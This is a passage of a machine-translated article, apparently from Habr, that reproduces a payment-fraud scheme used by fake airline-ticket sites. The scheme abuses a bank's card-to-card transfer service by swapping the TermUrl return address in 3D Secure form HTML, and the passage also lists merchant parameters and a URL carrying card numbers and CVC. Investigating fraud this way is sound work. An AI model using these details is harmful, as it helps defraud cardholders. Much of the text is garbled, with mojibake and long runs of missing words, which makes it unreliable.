<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C√≥digo de p√°gina HTML seguro 3D antes del reemplazo de l√≠nea</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ONLOAD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript:OnLoadEvent();"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ACTION</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://acs3.sbrf.ru:443/acs/pa?id=QAB6XaYQTRm-t_6DHVnp2Q"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">METHOD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ThreeDform"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_self"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"PaReq"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"eJxVUmFPgzAQ/SuE966lY2iWo4aJOl1mcG7TfTK1VCCOwkpR9u9tJ3P6pbn37nLv+u7gsiu3zqdQTVHJ0PUG2HWE5FVayCx0V8ubswv3ksIyV0LET4K3SlCYi6ZhmXCKNHSTaCF24+doErywzeNyUZ7p1yCermVNHl0KhzSFXoCa/gMC6AhNJ8VzJjUFxneTuwfqYzLC54B6CKVQdzHFGAfYI8TH/pB4GNAPDZKVgl5Fi5jYx0meJtHDbLBYATpkgFet1GpPA38I6AigVVuaa12PEaqbNyY/BqoFZFlAp4GS1kaN6dIVKZ2pgu2f41s565JNs84SKbL9+z0bbXkIyFZAyrSgBHuBhz3fwcGYjMZDo3vggZVWnnojbMbvAdRWI/qb+cuAcVuZZRznPyIQXV1JYSqMlb8xpKLhVBf8Q2inZnsjbAlAp49cTa3PXBvrSKp1rqOvbZJVs/VXdPuez7vdZj59uw6t+4ciK1QYx7xz63kPANk2qF8s6m/BRP9u5BtPwMYZ"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"MD"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"161732779-506DEA0AD5677154"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/cgi-bin/cgi_link"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
</span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">OnLoadEvent</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) 
</span></span></span><span class="javascript">{
  </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.forms[</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0</span></span></span><span class="javascript">].submit();
}
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
C√≥digo HTML de la p√°gina despu√©s de que reemplaza parte del texto, debajo del spoiler. </font><font style="vertical-align: inherit;">El c√≥digo se obtuvo durante la prueba escribiendo la variable $ pp en un archivo de texto. </font><font style="vertical-align: inherit;">L√≠nea 174 del script payp2p.php.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C√≥digo de p√°gina HTML seguro 3D despu√©s de reemplazar una cadena</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ONLOAD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript:OnLoadEvent();"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ACTION</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://acs3.sbrf.ru:443/acs/pa?id=QAB6XaYQTRm-t_6DHVnp2Q"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">METHOD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ThreeDform"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_self"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"PaReq"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"eJxVUmFPgzAQ/SuE966lY2iWo4aJOl1mcG7TfTK1VCCOwkpR9u9tJ3P6pbn37nLv+u7gsiu3zqdQTVHJ0PUG2HWE5FVayCx0V8ubswv3ksIyV0LET4K3SlCYi6ZhmXCKNHSTaCF24+doErywzeNyUZ7p1yCermVNHl0KhzSFXoCa/gMC6AhNJ8VzJjUFxneTuwfqYzLC54B6CKVQdzHFGAfYI8TH/pB4GNAPDZKVgl5Fi5jYx0meJtHDbLBYATpkgFet1GpPA38I6AigVVuaa12PEaqbNyY/BqoFZFlAp4GS1kaN6dIVKZ2pgu2f41s565JNs84SKbL9+z0bbXkIyFZAyrSgBHuBhz3fwcGYjMZDo3vggZVWnnojbMbvAdRWI/qb+cuAcVuZZRznPyIQXV1JYSqMlb8xpKLhVBf8Q2inZnsjbAlAp49cTa3PXBvrSKp1rqOvbZJVs/VXdPuez7vdZj59uw6t+4ciK1QYx7xz63kPANk2qF8s6m/BRP9u5BtPwMYZ"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"MD"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"161732779-506DEA0AD5677154"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://p2p.localhost/sus.php?cd=BX3FKT"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
</span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">OnLoadEvent</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) 
</span></span></span><span class="javascript">{
  </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.forms[</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0</span></span></span><span class="javascript">].submit();
}
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En resumen, en el c√≥digo HTML de la p√°gina 3D Secure (en este ejemplo, de Sberbank) la l√≠nea:</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/cgi-bin/cgi_link"</span></span></span><span class="hljs-tag">&gt;</span></span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cambios program√°ticos a:</font></font><br>
 <br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://p2p.localhost/sus.php?cd=BX3FKT"</span></span></span><span class="hljs-tag">&gt;</span></span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La cadena de reemplazo es la direcci√≥n de la p√°gina a la que la tarjeta bancaria emisora ‚Äã‚Äãdel remitente, despu√©s de verificar el c√≥digo 3D Secure, debe devolver al usuario. Antes de que el script reemplazara la l√≠nea, el sitio web de Promsvyazbank se especificaba como la direcci√≥n de retorno. Despu√©s de que el gui√≥n ha reemplazado la l√≠nea, alguna p√°gina del sitio fraudulento ya se indica como la direcci√≥n de retorno.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No entiendo completamente en qu√© punto exacto se est√° reemplazando la direcci√≥n de retorno, pero funciona. En ese momento, cuando el navegador muestra la p√°gina https de Sberbank con una solicitud para ingresar el c√≥digo 3D Secure, si observa el c√≥digo fuente HTML de la p√°gina en el navegador, no hay una direcci√≥n de retorno a ning√∫n sitio. El c√≥digo HTML de esta p√°gina tiene una longitud de m√°s de 400 l√≠neas y es completamente diferente del c√≥digo HTML de la p√°gina de respuesta de Sberbank que se captur√≥ al escribir las variables $ page (l√≠nea 166) y $ pp (l√≠nea 174) en el disco.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si ingresa el c√≥digo 3D Secure incorrecto, Sberbank en su p√°gina muestra un mensaje de que el c√≥digo es incorrecto y env√≠a otro SMS. Tan pronto como se ingresa el c√≥digo correcto, se lo redirige al sitio de pago o al sitio de reemplazo. Es decir, probablemente, la redirecci√≥n al sitio de pago implica que desde Sberbank se han completado todos los procedimientos necesarios. Sberbank aqu√≠ sirve como un ejemplo para las pruebas. La transferencia tambi√©n se puede hacer a trav√©s de otro banco.</font></font><br>
<br>
<img src="https://habrastorage.org/files/67f/61d/011/67f61d0110d6481ca5115d314953530c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Desde el lado del "comprador del boleto" se ve as√≠. El comprador en una forma de pago preparada previamente ingresa su n√∫mero de tarjeta. Despu√©s de eso, la p√°gina de confirmaci√≥n del c√≥digo 3D Secure se muestra casi de inmediato y llega un SMS con un c√≥digo de confirmaci√≥n. La p√°gina 3D Secure en el navegador se muestra en el sitio web del banco del emisor de la tarjeta del comprador a trav√©s de HTTPS. La p√°gina con el formulario para ingresar el n√∫mero de tarjeta puede parecer sospechosa, pero la confirmaci√≥n 3D Secure en el sitio web de su banco no causa ninguna duda o sospecha. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Por cierto, preste atenci√≥n a la firma "ticket ticket" en la l√≠nea "Descripci√≥n" en la p√°gina 3D Secure de Sberbank. Esta firma se establece en el script payp2p.php. En ejemplos futuros, intentaremos cambiarlo. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Volvamos a las pruebas.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ingres√© el c√≥digo de SMS en la p√°gina de Sberbank y despu√©s de hacer clic en el bot√≥n "Enviar", recib√≠ una advertencia de que los datos se enviar√≠an a trav√©s de una conexi√≥n insegura. </font></font><br>
<br>
<img src="https://habrastorage.org/files/f0c/33c/ce6/f0c33cce63e54f30b07837ae52bd52c8.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Despu√©s de confirmar que estoy de acuerdo con enviar datos a trav√©s de una conexi√≥n insegura, fui redirigido a la </font></font><br>
<br>
<img src="https://habrastorage.org/files/e86/a82/2f6/e86a822f66024701ade52e4bc3388a38.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
p√°gina </font><font style="vertical-align: inherit;">/sus.php?cd=‚Ä¶ </font><font style="vertical-align: inherit;">. Esta es la p√°gina de retorno. La direcci√≥n de retorno se establece en el script. En este caso, no se encontr√≥ la p√°gina. Pero la raz√≥n es clara: la p√°gina de retorno no se prepar√≥ de antemano. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aunque el objetivo casi se logr√≥, el </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dinero de una tarjeta a otra realmente no pas√≥</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . No hubo sms adicionales con informaci√≥n de que el pago fue rechazado, etc.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Decid√≠ que la raz√≥n del fracaso en el primer intento fue que el sitio local (localhost) trabaj√≥ en una conexi√≥n http insegura, y el sitio Sberbank en un protocolo http seguro. Http y https no son muy amigables entre s√≠. Esto, por cierto, explica por qu√© los sitios fraudulentos descritos en la primera parte de la publicaci√≥n utilizaron una conexi√≥n https segura, aunque con el certificado m√°s simple. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para verificar esta suposici√≥n, tuve que configurar el protocolo https en el sitio local. Para hacer esto, se cre√≥ un dominio local p2p.localhost y un certificado autofirmado. Como resultado, la nueva direcci√≥n con el script de prueba comenz√≥ a verse as√≠: </font></font><br>
<br>
<code>https://p2p.localhost/payp2p.php</code><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Adem√°s, la direcci√≥n de la p√°gina a la que se debe realizar la devoluci√≥n despu√©s de ingresar el c√≥digo 3D Secure se cambi√≥ en el script. La p√°gina de retorno en s√≠ tambi√©n fue preparada previamente.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Intentamos nuevamente realizar un pago con un sitio local que funciona a trav√©s del protocolo https. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cuando se conecta por primera vez, el navegador insiste naturalmente en la conexi√≥n segura configurada incorrectamente. Esto se debe al hecho de que tenemos un certificado autofirmado. </font></font><br>
<br>
<img src="https://habrastorage.org/files/8d1/ff3/73f/8d1ff373f65d4f70af5fa16538e13d5d.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como se conoce la fuente del certificado, lo agregamos a las excepciones. </font></font><br>
<br>
<img src="https://habrastorage.org/files/06a/317/d22/06a317d220884c5b93844dff1929907e.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Eso es todo. Ahora la conexi√≥n se realiza a trav√©s de https y al cambiar del sitio web de Sberbank, las advertencias desaparecen. </font></font><br>
<br>
<img src="https://habrastorage.org/files/df9/2c7/ad5/df92c7ad553e492e9192167abb150826.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Despu√©s de ingresar el c√≥digo 3D Secure, el regreso a la p√°gina especialmente preparada se realiza correctamente. </font></font><br>
<br>
<img src="https://habrastorage.org/files/0a7/21a/677/0a721a677a9a46e68605c7f03beb4bc4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Todo funciona bien, excepto </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">que el dinero realmente no funciona</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Como resultado, tuve que probar y buscar durante varios d√≠as, lo que podr√≠a ser la raz√≥n.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Solo ten√≠a una parte de los archivos que se usan en uno de los sitios de boletos de avi√≥n fraudulentos. Entre los archivos que me enviaron, hab√≠a un archivo payment.php. Esto es similar al script analizado anteriormente. A juzgar por el c√≥digo, probablemente fue creado no para enga√±ar a los visitantes en el "sitio de combate", sino para probar por un programador-desarrollador la posibilidad de transferir de una tarjeta a otra a trav√©s del servicio 3ds.payment.ru. Es poco probable, pero te√≥ricamente en las primeras versiones de sitios fraudulentos, podr√≠a usarse no solo para pruebas. </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Intent√© hacer un pago usando el script alternativo payment.php y el pago pas√≥ la primera vez.</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Lo √∫nico que la confirmaci√≥n del pago exitoso se mostr√≥ en el sitio web 3ds.payment.ru. </font><font style="vertical-align: inherit;">Decid√≠ que dado que este script funciona, ser√° posible encontrar la raz√≥n por la cual el primer script en la descripci√≥n (payp2p.php) no funciona.</font></font><br>
<br>
<img src="https://habrastorage.org/files/113/941/882/1139418821c64ae4a67cdefba3b3fd59.png"><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C√≥digo de script completo payment.php bajo el spoiler</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/c65/c1f/56d/c65c1f56d0fe4e8c895bfbcd98109349.png"><br>
     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descripci√≥n de las diferencias entre las secuencias de comandos payment.php y payp2p.php</font></font></b><div class="spoiler_text">     .    .<br>
<br>
 payp2p.php       POST  .  payment.php     GET    .  ,      ,       :<br>
<br>
<code>https://p2p.localhost/payment.php?card_1=1111&amp;card_2=2222...&amp;cvc=999...&amp;price=30... </code><br>
<br>
    ,         ¬´ ¬ª.<br>
<br>
Payment.php    payp2p.php       MySQL.        .       .<br>
<br>
Payment.php      .        ,     .   ,  payp2p.php    ,   ,  payment.php      . TERMINAL=24043210, MERCH_NAME=PSB, MERCHANT=000601224043202, EMAIL=lakhtin%40psbank.ru, TRTYPE=8 (    TRTYPE    .   payp2p.php  ).<br>
<br>
  ‚Äî payment.php         <code>https://3ds.payment.ru/cgi-bin/is_3DS</code>.          <code>{"IS_ACTIVE":"Y"}</code>      ,        (   3D Secure).<br>
<br>
    .      payment.php     .  ,        3ds.payment.ru.<br>
</div></div><br>
<blockquote>  ‚Ä¶  ,       Firefox,  ¬´¬ª  payment.php      (¬´Firefox/3.0.3¬ª),  ,          , ,           . ,  3.5 Firefox    2009 ,  4 Firefox     2011,      payp2p.php ,  ¬´Firefox/38.0¬ª,      2016  ‚Äî Firefox 49.</blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Luego hubo intentos de arreglar el script payp2p.php que no funcionaba por alguna raz√≥n, arreglarlo, tomando el script de trabajo como base. Se han probado varias opciones. Todas las piezas de c√≥digo que de alguna manera podr√≠an afectar el trabajo a su vez se transfirieron del script de trabajo al no funcional. Entre otras cosas, hubo un intento de una conexi√≥n intermedia adicional a </font></font><code>https://3ds.payment.ru/cgi-bin/is_3DS</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">; cambiando, activando y desactivando las opciones cURL, etc. Nada ayud√≥, la flor de piedra no sali√≥. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
M√°s tarde, durante las pruebas, se decidi√≥ desactivar los redireccionamientos en la etapa final en payp2p.php. Despu√©s de eso, se hizo posible leer el mensaje de error de Promsvyazbank. Captura de pantalla del error a continuaci√≥n. En el navegador despu√©s de un intento fallido de realizar un pago, se muestra otra p√°gina, pero si hace clic en "Atr√°s" una o m√°s veces, puede ver esta p√°gina.</font></font><br>
<br>
<img src="https://habrastorage.org/files/11f/86c/ecd/11f86cecd02b46828d04419e18f8354b.png"><br>
<blockquote>: <br>
<br>
,         . <br>
<br>
  : /   (/)<br>
,       ,    / </blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Existen algunas restricciones en la cantidad de pagos de una tarjeta por d√≠a en el sitio web de Promsvyazyazbank, etc. Aunque no exced√≠ los l√≠mites en la cantidad de pagos reales, es posible que los pagos no se hayan realizado en alg√∫n momento, debido a la gran cantidad de intentos. (Para capturar los valores de las variables durante la depuraci√≥n, comenc√© el proceso de pago muchas veces, pero no lo termin√©) No s√© la raz√≥n exacta de este mensaje. Cada intento de pagar ORDER_NUM y TIMESTAMP usa uno nuevo. No deber√≠an haber influido en la aparici√≥n de tal error. Aunque la tarjeta que utilic√© para el pago, un pago exitoso pas√≥ por un script pago.php alternativo, tal vez la tarjeta del remitente o del destinatario entr√≥ en la lista de espera.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
